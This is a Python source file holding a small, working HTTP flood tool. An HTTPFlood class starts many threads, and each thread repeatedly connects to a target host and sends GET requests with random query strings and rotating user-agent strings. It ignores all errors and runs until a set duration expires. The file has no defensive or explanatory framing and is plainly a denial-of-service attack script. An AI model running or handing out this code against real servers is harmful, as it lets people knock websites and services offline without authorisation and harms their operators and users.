import socket
import threading
import time
import random

class HTTPFlood:
    def __init__(self, target, port, threads, duration):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.is_running = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15)"
        ]

    def attack(self):
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.sendto(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode(), (self.target, self.port))
                s.sendto(f"Host: {self.target}\r\n".encode(), (self.target, self.port))
                s.sendto(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode(), (self.target, self.port))
                s.sendto("Accept: text/html,application/xhtml+xml\r\n".encode(), (self.target, self.port))
                s.sendto("Connection: keep-alive\r\n\r\n".encode(), (self.target, self.port))
                s.close()
            except:
                pass

    def start(self):
        self.is_running = True
        for _ in range(self.threads):
            threading.Thread(target=self.attack).start()
        threading.Thread(target=self.stop_after_duration).start()

    def stop_after_duration(self):
        time.sleep(self.duration)
        self.stop()

    def stop(self):
        self.is_running = False